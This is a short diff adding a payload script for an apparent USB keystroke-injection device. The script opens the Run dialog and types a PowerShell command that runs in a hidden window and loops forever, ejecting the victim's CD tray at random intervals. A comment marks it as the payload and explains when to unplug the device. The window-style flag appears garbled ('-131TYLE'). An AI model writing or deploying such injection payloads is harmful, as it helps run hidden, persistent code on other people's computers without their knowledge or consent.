@@ -1,0 +1,4 @@
+Press: 131 + 114
+PrintLine: POWERSHELL -131TYLE HIDDEN -C \"WHILE ($TRUE){$RANDOM = GET-RANDOM -MINIMUM 10 -MAXIMUM 240; SLEEP -SECONDS $RANDOM; $ITEMS = (NEW-OBJECT -COM \"WMPLAYER.OCX.7\").CDROMCOLLECTION.ITEM(0); $ITEMS.EJECT()}\"
+Rem: End of payload* you can unplug the device when you see the led flash
+BlinkLED: 5
